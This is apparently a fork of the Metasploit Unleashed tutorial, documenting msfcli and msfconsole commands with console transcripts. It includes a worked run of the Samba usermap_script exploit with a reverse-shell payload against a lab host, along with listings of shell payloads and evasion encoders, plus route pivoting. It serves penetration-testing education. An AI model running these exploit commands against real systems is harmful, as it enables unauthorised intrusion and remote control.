**************************
Metasploit Fundamentals
**************************

This is a fork from https://www.offensive-security.com/metasploit-unleashed/

In learning how to use Metasploit you will find there are many different interfaces to use with this hacking tool, each with their own strengths and weaknesses. As such, there is no one perfect interface to use with the Metasploit console, although the MSFConsole is the only supported way to access most Metasploit commands. It is still beneficial, however, to be comfortable with all Metasploit interfaces.

MsfCli
=======

The msfcli provides a powerful command line interface to the framework. This allows you to easily add Metasploit exploits into any scripts you may create.
> Note: As of 2015-06-18 msfcli has been removed. One way to obtain similar functionality through msfconsole is by using the -x option. For example, the following command sets all the options for samba/usermap_script and runs it against a target:

::

  root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
  set RHOST 172.16.194.172;\
  set PAYLOAD cmd/unix/reverse;\
  set LHOST 172.16.194.163;\
  run"


Running the msfcli help command:


::

  root@kali:~# msfcli -h
  Usage: /usr/bin/msfcli  >option=value> [mode]
 ===========================================================

    Mode           Description
    ----           -----------
    (A)dvanced     Show available advanced options for this module
    (AC)tions      Show available actions for this auxiliary module
    (C)heck        Run the check routine of the selected module
    (E)xecute      Execute the selected module
    (H)elp         You're looking at it baby!
    (I)DS Evasion  Show available ids evasion options for this module
    (O)ptions      Show available options for this module
    (P)ayloads     Show available payloads for this module
    (S)ummary      Show information about this module
    (T)argets      Show available targets for this exploit module

 Examples:
 msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=IP E
 msfcli auxiliary/scanner/http/http_version rhosts=IP encoder= post= nop= E


Note: when using msfcli, variables are assigned using the “equal to” operator = and that all options are case-sensitive.


::

  root@kali:~# msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/reverse LHOST=172.16.194.163 E
 [*] Please wait while we load the module tree...

                ##                          ###           ##    ##
 ##  ##  #### ###### ####  #####   #####    ##    ####        ######
 ####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
 ####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
 ## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
 ##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                      ##


       =[ metasploit v4.5.0-dev [core:4.5 api:1.0]
 + -- --=[ 936 exploits - 500 auxiliary - 151 post
 + -- --=[ 252 payloads - 28 encoders - 8 nops
       =[ svn r15767 updated today (2012.08.22)

 RHOST => 172.16.194.172
 PAYLOAD => cmd/unix/reverse
 [*] Started reverse double handler
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
 [*] Command: echo cSKqD83oiquo0xMr;
 [*] Writing to socket A
 [*] Writing to socket B
 [*] Reading from sockets...
 [*] Reading from socket B
 [*] B: "cSKqD83oiquo0xMr\r\n"
 [*] Matching...
 [*] A is input...
 [*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:57682) at 2012-06-14 09:58:19 -0400

 uname -a
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

If you aren’t entirely sure about what options belong to a particular module, you can append the letter ‘O‘ to the end of the string at whichever point you are stuck.

::

  root@kali:~# msfcli exploit/multi/samba/usermap_script O
 [*] Initializing modules...

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port


To display available payloads for the current module, append the letter ‘P‘ to the msfcli command line string.

::

  root@kali:~# msfcli exploit/multi/samba/usermap_script P
 [*]Initializing modules...

 Compatible payloads
 ===================

   Name                                Description
   ----                                -----------
   cmd/unix/bind_awk                   Listen for a connection and spawn a command shell via GNU AWK
   cmd/unix/bind_inetd                 Listen for a connection and spawn a command shell (persistent)
   cmd/unix/bind_lua                   Listen for a connection and spawn a command shell via Lua
   cmd/unix/bind_netcat                Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_netcat_gaping         Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_netcat_gaping_ipv6    Listen for a connection and spawn a command shell via netcat
   cmd/unix/bind_perl                  Listen for a connection and spawn a command shell via perl
   cmd/unix/bind_perl_ipv6             Listen for a connection and spawn a command shell via perl
   cmd/unix/bind_ruby                  Continually listen for a connection and spawn a command shell via Ruby
   cmd/unix/bind_ruby_ipv6             Continually listen for a connection and spawn a command shell via Ruby
   cmd/unix/bind_zsh
        Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is
        often available, please be aware it isn't usually installed by default.

   cmd/unix/generic                    Executes the supplied command
   cmd/unix/reverse                    Creates an interactive shell through two inbound connections
   cmd/unix/reverse_awk                Creates an interactive shell via GNU AWK
   cmd/unix/reverse_lua                Creates an interactive shell via Lua
   cmd/unix/reverse_netcat             Creates an interactive shell via netcat
   cmd/unix/reverse_netcat_gaping      Creates an interactive shell via netcat
   cmd/unix/reverse_openssl            Creates an interactive shell through two inbound connections
   cmd/unix/reverse_perl               Creates an interactive shell via perl
   cmd/unix/reverse_perl_ssl           Creates an interactive shell via perl, uses SSL
   cmd/unix/reverse_php_ssl            Creates an interactive shell via php, uses SSL
   cmd/unix/reverse_python             Connect back and create a command shell via Python
   cmd/unix/reverse_python_ssl         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
   cmd/unix/reverse_ruby               Connect back and create a command shell via Ruby
   cmd/unix/reverse_ruby_ssl           Connect back and create a command shell via Ruby, uses SSL
   cmd/unix/reverse_ssl_double_telnet  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option
   cmd/unix/reverse_zsh
        Connect back and create a command shell via Zsh.  Note: Although Zsh is often
        available, please be aware it isn't usually installed by default.


Benefits of the MSFcli Interface

* Supports the launching of exploits and auxiliary modules
*  Useful for specific tasks
*  Good for learning
*  Convenient to use when testing or developing a new exploit
*  Good tool for one-off exploitation
*  Excellent if you know exactly which exploit and options you need
*  Wonderful for use in scripts and basic automation

The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn’t support any of the advanced automation features of msfconsole.

msfconsole
==========

::

 back          Move back from the current context
 banner        Display an awesome metasploit banner
 cd            Change the current working directory
 color         Toggle color
 connect       Communicate with a host
 edit          Edit the current module with $VISUAL or $EDITOR
 exit          Exit the console
 get           Gets the value of a context-specific variable
 getg          Gets the value of a global variable
 go_pro        Launch Metasploit web GUI

 grep          Grep the output of another command
 help          Help menu
 info          Displays information about one or more module
 irb           Drop into irb scripting mode
 jobs          Displays and manages jobs
 kill          Kill a job
 load          Load a framework plugin
 loadpath      Searches for and loads modules from a path
 makerc        Save commands entered since start to a file
 popm          Pops the latest module off the stack and makes it active

 previous      Sets the previously loaded module as the current module
 pushm         Pushes the active or list of modules onto the module stack
 quit          Exit the console
 reload_all    Reloads all modules from all defined module paths
 rename_job    Rename a job
 resource      Run the commands stored in a file
 route         Route traffic through a session
 save          Saves the active datastores
 search        Searches module names and descriptions
 sessions      Dump session listings and display information about sessions

 set           Sets a context-specific variable to a value
 setg          Sets a global variable to a value
 show          Displays modules of a given type, or all modules
 sleep         Do nothing for the specified number of seconds
 spool         Write console output into a file as well the screen
 threads       View and manipulate background threads
 unload        Unload a framework plugin
 unset         Unsets one or more context-specific variables
 unsetg        Unsets one or more global variables
 use           Selects a module by name
 version       Show the framework and console library version numbers


back
^^^^

Once you have finished working with a particular module, or if you inadvertently select the wrong module, you can issue the back command to move out of the current context. This, however is not required. Just as you can in commercial routers, you can switch modules from within other modules. As a reminder, variables will only carry over if they are set globally.

::

 msf auxiliary(ms09_001_write) > back
 msf >


banner
^^^^^^

Simply displays a randomly selected banner

::

 msf > banner
  _                                                    _
 /     /         __                         _   __  /_/ __
 | |  / | _____               ___   _____ | | /   _
 | | /| | | ___ |- -|   /    / __ | -__/ | || | || | |- -|
 |_|   | | | _|__  | |_  / - __    | |    | | __/| |  | |_
      |/  |____/  ___/ / \___/   /     __|    |_  ___

 Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
 Metasploit Pro -- type 'go_pro' to launch it now.

       =[ metasploit v4.11.4-2015071402                   ]
 + -- --=[ 1467 exploits - 840 auxiliary - 232 post        ]
 + -- --=[ 432 payloads - 37 encoders - 8 nops             ]


check
^^^^

There aren’t many exploits that support it, but there is also a check option that will check to see if a target is vulnerable to a particular exploit instead of actually exploiting it.

::

 msf exploit(ms08_067_netapi) > show options

 Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    172.16.194.134   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

 Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

 msf exploit(ms08_067_netapi) > check

 [*] Verifying vulnerable status... (path: 0x0000005a)
 [*] System is not vulnerable (status: 0x00000000)
 [*] The target is not exploitable.
 msf  exploit(ms08_067_netapi) >

color
^^^^^^

You can enable or disable if the output you get through the msfconsole will contain colors.

::

 msf > color
 Usage: color >'true'|'false'|'auto'>

 Enable or disable color output.

connect
^^^^^^

There is a miniature Netcat clone built into the msfconsole that supports SSL, proxies, pivoting, and file transfers. By issuing the connect command with an IP address and port number, you can connect to a remote host from within msfconsole the same as you would with Netcat or Telnet.

::

  msf > connect 192.168.1.1 23
 [*] Connected to 192.168.1.1:23
 DD-WRT v24 std (c) 2008 NewMedia-NET GmbH
 Release: 07/27/08 (SVN revision: 10011)
 DD-WRT login:

You can see all the additional options by issuing the “-h” parameter.

::

  msf > connect -h
 Usage: connect [options]

 Communicate with a host, similar to interacting via netcat, taking advantage of
 any configured session pivoting.

 OPTIONS:

    -C        Try to use CRLF for EOL sequence.
    -P <opt>  Specify source port.
    -S <opt>  Specify source address.
    -c <opt>  Specify which Comm to use.
    -h        Help banner.
    -i <opt>  Send the contents of a file.
    -p <opt>  List of proxies to use.
    -s        Connect with SSL.
    -u        Switch to a UDP socket.
    -w <opt>  Specify connect timeout.
    -z        Just try to connect, then return.

 msf >

edit
^^^^

The edit command will edit the current module with $VISUAL or $EDITOR. By default, this will open the current module in Vim.

::

  msf exploit(ms10_061_spoolss) > edit
 [*] Launching /usr/bin/vim /usr/share/metasploit-framework/modules/exploits/windows/smb/ms10_061_spoolss.rb

 ##
 # This module requires Metasploit: http//metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##

 require 'msf/core'
 require 'msf/windows_error'

 class Metasploit3 > Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info = {})

exit
^^^^

The exit command will simply exit msfconsole.

::
 msf exploit(ms10_061_spoolss) > exit
 root@kali:~#

grep
^^^^

The grep command is similar to Linux grep. It matches a given pattern from the output of another msfconsole command. The following is an example of using grep to match output containing the string “http” from a search for modules containing the string “oracle”.

::

  msf > grep
 Usage: grep [options] pattern cmd

 Grep the results of a console command (similar to Linux grep command)

 OPTIONS:

    -A <opt>  Show arg lines of output After a match.
    -B <opt>  Show arg lines of output Before a match.
    -c        Only print a count of matching lines.
    -h        Help banner.
    -i        Ignore case.
    -k <opt>  Keep (include) arg lines at start of output.
    -m <opt>  Stop after arg matches.
    -s <opt>  Skip arg lines of output before attempting match.
    -v        Invert match.
 msf >
 msf > grep http search oracle
   auxiliary/scanner/http/oracle_demantra_database_credentials_leak      2014-02-28       normal     Oracle Demantra Database Credentials Leak
   auxiliary/scanner/http/oracle_demantra_file_retrieval                 2014-02-28       normal     Oracle Demantra Arbitrary File Retrieval with Authentication Bypass
   auxiliary/scanner/http/oracle_ilom_login                                               normal     Oracle ILO Manager Login Brute Force Utility
   exploit/multi/http/glassfish_deployer                                 2011-08-04       excellent  Sun/Oracle GlassFish Server Authenticated Code Execution
   exploit/multi/http/oracle_ats_file_upload                             2016-01-20       excellent  Oracle ATS Arbitrary File Upload
   exploit/multi/http/oracle_reports_rce                                 2014-01-15       great      Oracle Forms and Reports Remote Code Execution
   exploit/windows/http/apache_chunked                                   2002-06-19       good       Apache Win32 Chunked Encoding
   exploit/windows/http/bea_weblogic_post_bof                            2008-07-17       great      Oracle Weblogic Apache Connector POST Request Buffer Overflow
   exploit/windows/http/oracle9i_xdb_pass                                2003-08-18       great      Oracle 9i XDB HTTP PASS Overflow (win32)
   exploit/windows/http/oracle_beehive_evaluation                        2010-06-09       excellent  Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability
   exploit/windows/http/oracle_beehive_prepareaudiotoplay                2015-11-10       excellent  Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload
   exploit/windows/http/oracle_btm_writetofile                           2012-08-07       excellent  Oracle Business Transaction Management FlashTunnelService Remote Code Execution
   exploit/windows/http/oracle_endeca_exec                               2013-07-16       excellent  Oracle Endeca Server Remote Command Execution
   exploit/windows/http/oracle_event_processing_upload                   2014-04-21       excellent  Oracle Event Processing FileUploadServlet Arbitrary File Upload
   exploit/windows/http/osb_uname_jlist                                  2010-07-13       excellent  Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability

help
^^^^

The help command will give you a list and small description of all available commands.

::

  msf > help

 Core Commands
 =============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
 ...snip...

 Database Backend Commands
 =========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
 ...snip...

info
^^^^

The info command will provide detailed information about a particular module including all options, targets, and other information. Be sure to always read the module description prior to using it as some may have un-desired effects.

The info command also provides the following information:

*  The author and licensing information
*  Vulnerability references (ie: CVE, BID, etc)
*  Any payload restrictions the module may have

::

  msf  exploit(ms09_050_smb2_negotiate_func_index) > info exploit/windows/smb/ms09_050_smb2_negotiate_func_index

       Name: Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
     Module: exploit/windows/smb/ms09_050_smb2_negotiate_func_index
    Version: 14774
   Platform: Windows
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Good

 Provided by:
  Laurent Gaffie
  hdm
  sf

 Available targets:
  Id  Name
  --  ----
  0   Windows Vista SP1/SP2 and Server 2008 (x86)

 Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  445              yes       The target port
  WAIT   180              yes       The number of seconds to wait for the attack to complete.

 Payload information:
  Space: 1024

 Description:
  This module exploits an out of bounds function table dereference in
  the SMB request validation code of the SRV2.SYS driver included with
  Windows Vista, Windows 7 release candidates (not RTM), and Windows
  2008 Server prior to R2. Windows Vista without SP1 does not seem
  affected by this flaw.

 References:
  http://www.microsoft.com/technet/security/bulletin/MS09-050.mspx
  http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-3103
  http://www.securityfocus.com/bid/36299
  http://www.osvdb.org/57799
  http://seclists.org/fulldisclosure/2009/Sep/0039.html
  http://www.microsoft.com/technet/security/Bulletin/MS09-050.mspx

 msf  exploit(ms09_050_smb2_negotiate_func_index) >

irb
^^^^

Running the irb command will drop you into a live Ruby interpreter shell where you can issue commands and create Metasploit scripts on the fly. This feature is also very useful for understanding the internals of the Framework.

::

  msf > irb
 [*] Starting IRB shell...

 >> puts "Hello, metasploit!"
 Hello, metasploit!
 => nil
 >> Framework::Version
 => "4.8.2-2014022601"

jobs
^^^^

Jobs are modules that are running in the background. The jobs command provides the ability to list and terminate these jobs.

::

  msf > jobs -h
 Usage: jobs [options]

 Active job manipulation and interaction.

 OPTIONS:

    -K        Terminate all running jobs.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate the specified job name.
    -l        List all running jobs.
    -v        Print more detailed info.  Use with -i and -l

 msf >

kill
^^^^^^^^^^

 The kill command will kill any running jobs when supplied with the job id.

 ::

   msf exploit(ms10_002_aurora) > kill 0
 Stopping job: 0...

 [*] Server stopped.


load
^^^^

The load command loads a plugin from Metasploit’s plugin directory. Arguments are passed as key=val on the shell.

::

  msf > load
 Usage: load  [var=val var=val ...]

 Loads a plugin from the supplied path.  If path is not absolute, first looks
 in the user's plugin directory (/root/.msf4/plugins) then
 in the framework root plugin directory (/usr/share/metasploit-framework/plugins).
 The optional var=val options are custom parameters that can be passed to plugins.

 msf > load pcap_log
 [*] PcapLog plugin loaded.
 [*] Successfully loaded plugin: pcap_log


loadpath
^^^^

The loadpath command will load a third-part module tree for the path so you can point Metasploit at your 0-day exploits, encoders, payloads, etc.

::

  msf > loadpath /home/secret/modules

 Loaded 0 modules.

unload
^^^^

Conversely, the unload command unloads a previously loaded plugin and removes any extended commands.

::

  msf > unload pcap_log
 Unloading plugin pcap_log...unloaded.

resource
^^^^^^

The resource command runs resource (batch) files that can be loaded through msfconsole.

::

  msf > resource
 Usage: resource path1 [path2 ...]

 Run the commands stored in the supplied files.  Resource files may also contain
 ruby code between  tags.

 See also: makerc

Some attacks, such as Karmetasploit, use resource files to run a set of commands in a karma.rc file to create an attack. Later, we will discuss how, outside of Karmetasploit, that can be very useful.

::

  msf > resource karma.rc
 [*] Processing karma.rc for ERB directives.
 resource (karma.rc_.txt)> db_connect postgres:toor@127.0.0.1/msfbook
 resource (karma.rc_.txt)> use auxiliary/server/browser_autopwn
 ...snip...


Batch files can greatly speed up testing and development times as well as allow the user to automate many tasks. Besides loading a batch file from within msfconsole, they can also be passed at startup using the -r flag. The simple example below creates a batch file to display the Metasploit version number at startup.

::

  root@kali:~# echo version > version.rc
 root@kali:~# msfconsole -r version.rc

  _                                                    _
 /     /         __                         _   __  /_/ __
 | |  / | _____               ___   _____ | | /   _
 | | /| | | ___ |- -|   /    / __ | -__/ | || | || | |- -|
 |_|   | | | _|__  | |_  / - __    | |    | | __/| |  | |_
       |/  |____/  ___/ / \___/   /     __|    |_  ___

 Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with
 Metasploit Pro -- type 'go_pro' to launch it now.

        =[ metasploit v4.8.2-2014021901 [core:4.8 api:1.0] ]
 + -- --=[ 1265 exploits - 695 auxiliary - 202 post ]
 + -- --=[ 330 payloads - 32 encoders - 8 nops      ]

 [*] Processing version.rc for ERB directives.
 resource (version.rc)> version
 Framework: 4.8.2-2014022601
 Console  : 4.8.2-2014022601.15168
 msf >

route
^^^^

The “route” command in Metasploit allows you to route sockets through a session or ‘comm’, providing basic pivoting capabilities. To add a route, you pass the target subnet and network mask followed by the session (comm) number.

::
  meterpreter > route -h
 Route traffic destined to a given subnet through a supplied session.

 Usage:
  route [add/remove] subnet netmask [comm/sid]
  route [add/remove] cidr [comm/sid]
  route [get]
  route [flush]
  route [print]

 Subcommands:
  add - make a new route
  remove - delete a route; 'del' is an alias
  flush - remove all routes
  get - display the route for a given target
  print - show all active routes

 Examples:
  Add a route for all hosts from 192.168.0.0 to 192.168.0.0 through session 1
    route add 192.168.0.0 255.255.255.0 1
    route add 192.168.0.0/24 1

  Delete the above route
    route remove 192.168.0.0/24 1
    route del 192.168.0.0 255.255.255.0 1

  Display the route that would be used for the given host or network
    route get 192.168.0.11

 meterpreter >



 meterpreter > route

 Network routes
 ==============

     Subnet           Netmask          Gateway
     ------           -------          -------
     0.0.0.0          0.0.0.0          172.16.1.254
     127.0.0.0        255.0.0.0        127.0.0.1
     172.16.1.0       255.255.255.0    172.16.1.100
     172.16.1.100     255.255.255.255  127.0.0.1
     172.16.255.255   255.255.255.255  172.16.1.100
     224.0.0.0        240.0.0.0        172.16.1.100
     255.255.255.255  255.255.255.255  172.16.1.100



search
^^^^

The msfconsole includes an extensive regular-expression based search functionality. If you have a general idea of what you are looking for, you can search for it via search. In the output below, a search is being made for MS Bulletin MS09-011. The search function will locate this string within the module names, descriptions, references, etc.

Note the naming convention for Metasploit modules uses underscores versus hyphens.

::

  msf > search usermap_script

 Matching Modules
 ================

   Name                                Disclosure Date  Rank       Description
   ----                                ---------------  ----       -----------
   exploit/multi/samba/usermap_script  2007-05-14       excellent  Samba "username map script" Command Execution

 msf >


help Search
^^^^^^^^

You can further refine your searches by using the built-in keyword system.


::

  msf > help search
 Usage: search [keywords]

 Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)

 Examples:
  search cve:2009 type:exploit app:client

 msf >


name
^^^^

To search using a descriptive name, use the name keyword.

::

  msf > search name:mysql

 Matching Modules
 ================

   Name                                               Disclosure Date  Rank       Description
   ----                                               ---------------  ----       -----------
   auxiliary/admin/mysql/mysql_enum                                    normal     MySQL Enumeration Module
   auxiliary/admin/mysql/mysql_sql                                     normal     MySQL SQL Generic Query
   auxiliary/analyze/jtr_mysql_fast                                    normal     John the Ripper MySQL Password Cracker (Fast Mode)
   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       normal     MySQL Authentication Bypass Password Dump
   auxiliary/scanner/mysql/mysql_hashdump                              normal     MYSQL Password Hashdump
   auxiliary/scanner/mysql/mysql_login                                 normal     MySQL Login Utility
   auxiliary/scanner/mysql/mysql_schemadump                            normal     MYSQL Schema Dump
   auxiliary/scanner/mysql/mysql_version                               normal     MySQL Server Version Enumeration
   exploit/linux/mysql/mysql_yassl_getname            2010-01-25       good       MySQL yaSSL CertDecoder::GetName Buffer Overflow
   exploit/linux/mysql/mysql_yassl_hello              2008-01-04       good       MySQL yaSSL SSL Hello Message Buffer Overflow
   exploit/windows/mysql/mysql_payload                2009-01-16       excellent  Oracle MySQL for Microsoft Windows Payload Execution
   exploit/windows/mysql/mysql_yassl_hello            2008-01-04       average    MySQL yaSSL SSL Hello Message Buffer Overflow
 msf >


platform
^^^^^^

You can use platform to narrow down your search to modules that affect a specific platform.

::

  msf > search platform:aix

 Matching Modules
 ================

   Name                                  Disclosure Date  Rank    Description
   ----                                  ---------------  ----    -----------
   payload/aix/ppc/shell_bind_tcp                         normal  AIX Command Shell, Bind TCP Inline
   payload/aix/ppc/shell_find_port                        normal  AIX Command Shell, Find Port Inline
   payload/aix/ppc/shell_interact                         normal  AIX execve shell for inetd
 ...snip...


type
^^^^

Using the type lets you filter by module type such as auxiliary, post, exploit, etc.

::

  msf > search type:post

 Matching Modules
 ================

   Name                                                Disclosure Date  Rank    Description
   ----                                                ---------------  ----    -----------
   post/linux/gather/checkvm                                            normal  Linux Gather Virtual Environment Detection
   post/linux/gather/enum_cron                                          normal  Linux Cron Job Enumeration
   post/linux/gather/enum_linux                                         normal  Linux Gather System Information
 ...snip...


author
^^^^^^

Searching with the author keyword lets you search for modules by your favourite author.


::

  msf > search author:dookie

 Matching Modules
 ================

   Name                                                       Disclosure Date  Rank     Description
   ----                                                       ---------------  ----     -----------
   exploit/osx/http/evocam_webserver                          2010-06-01       average  MacOS X EvoCam HTTP GET Buffer Overflow
   exploit/osx/misc/ufo_ai                                    2009-10-28       average  UFO: Alien Invasion IRC Client Buffer Overflow Exploit
   exploit/windows/browser/amaya_bdo                          2009-01-28       normal   Amaya Browser v11.0 bdo tag overflow
 ...snip...


multiple
^^^^^^

You can also combine multiple keywords together to further narrow down the returned results.


::

  msf > search cve:2011 author:jduck platform:linux

 Matching Modules
 ================

   Name                                         Disclosure Date  Rank     Description
   ----                                         ---------------  ----     -----------
   exploit/linux/misc/netsupport_manager_agent  2011-01-08       average  NetSupport Manager Agent Remote Buffer Overflow


sessions
^^^^^^

The sessions command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNC, etc.


::

  msf > sessions -h
 Usage: sessions [options] or sessions [id]

 Active session manipulation and interaction.

 OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -c <opt>  Run a command on the session given with -i, or all
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -q        Quiet mode
    -r        Reset the ring buffer for the session given with -i, or all
    -s <opt>  Run a script on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List sessions in verbose mode
    -x        Show extended information in the session table

 Many options allow specifying session ranges using commas and dashes.
 For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6


To list any active sessions, pass the -l options to sessions.


::

  msf exploit(3proxy) > sessions -l

 Active sessions
 ===============

  Id  Description    Tunnel
  --  -----------    ------
  1   Command shell  192.168.1.101:33191 -> 192.168.1.104:4444


To interact with a given session, you just need to use the ‘-i’ switch followed by the Id number of the session.

::

 msf exploit(3proxy) > sessions -i 1
 [*] Starting interaction with 1...

 C:WINDOWSsystem32>


set
^^^^

The set command allows you to configure Framework options and parameters for the current module you are working with.


::

  msf auxiliary(ms09_050_smb2_negotiate_func_index) > set RHOST 172.16.194.134
 RHOST => 172.16.194.134
 msf auxiliary(ms09_050_smb2_negotiate_func_index) > show options

 Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  172.16.194.134   yes       The target address
   RPORT  445              yes       The target port
   WAIT   180              yes       The number of seconds to wait for the attack to complete.

 Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


Metasploit also allows you to set an encoder to use at run-time. This is particularly useful in exploit development when you aren’t quite certain as to which payload encoding methods will work with a given exploit.


::

  msf  exploit(ms09_050_smb2_negotiate_func_index) > show encoders

 Compatible Encoders
 ===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder


unset
^^^^

The opposite of the set command, of course, is unset. unset removes a parameter previously configured with set. You can remove all assigned variables with unset all.

::

  msf > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf > set THREADS 50
 THREADS => 50
 msf > set

 Global
 ======

  Name     Value
  ----     -----
  RHOSTS   192.168.1.0/24
  THREADS  50

 msf > unset THREADS
 Unsetting THREADS...
 msf > unset all
 Flushing datastore...
 msf > set

 Global
 ======

 No entries in data store.

 msf >


setg
^^^^

In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.


::

  msf > setg LHOST 192.168.1.101
 LHOST => 192.168.1.101
 msf > setg RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf > setg RHOST 192.168.1.136
 RHOST => 192.168.1.136


After setting your different variables, you can run the save command to save your current environment and settings. With your settings saved, they will be automatically loaded on startup, which saves you from having to set everything again.


::

  msf > save
 Saved configuration to: /root/.msf4/config
 msf >


show
^^^^

Entering show at the msfconsole prompt will display every module within Metasploit.

::

  msf > show

 Encoders
 ========

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   cmd/generic_sh                           good       Generic Shell Variable Substitution Command Encoder
   cmd/ifs                                  low        Generic ${IFS} Substitution Command Encoder
   cmd/printf_php_mq                        manual     printf(1) via PHP magic_quotes Utility Command Encoder
 ...snip...

There are a number of show commands you can use but the ones you will use most frequently are show auxiliary, show exploits, show payloads, show encoders, and show nops.


auxiliary
^^^^^^

Executing show auxiliary will display a listing of all of the available auxiliary modules within Metasploit. As mentioned earlier, auxiliary modules include scanners, denial of service modules, fuzzers, and more.

::

  msf > show auxiliary
 Auxiliary
 =========

   Name                                                  Disclosure Date  Rank    Description
   ----                                                  ---------------  ----    -----------
   admin/2wire/xslt_password_reset                       2007-08-15       normal  2Wire Cross-Site Request Forgery Password Reset Vulnerability
   admin/backupexec/dump                                                  normal  Veritas Backup Exec Windows Remote File Access
   admin/backupexec/registry                                              normal  Veritas Backup Exec Server Registry Access
 ...snip...


exploits
^^^^^^

Naturally, show exploits will be the command you are most interested in running since at its core, Metasploit is all about exploitation. Run show exploits to get a listing of all exploits contained in the framework.

::
  msf > show exploits

 Exploits
 ========

   Name                                                           Disclosure Date  Rank       Description
   ----                                                           ---------------  ----       -----------
   aix/rpc_cmsd_opcode21                                          2009-10-07       great      AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow
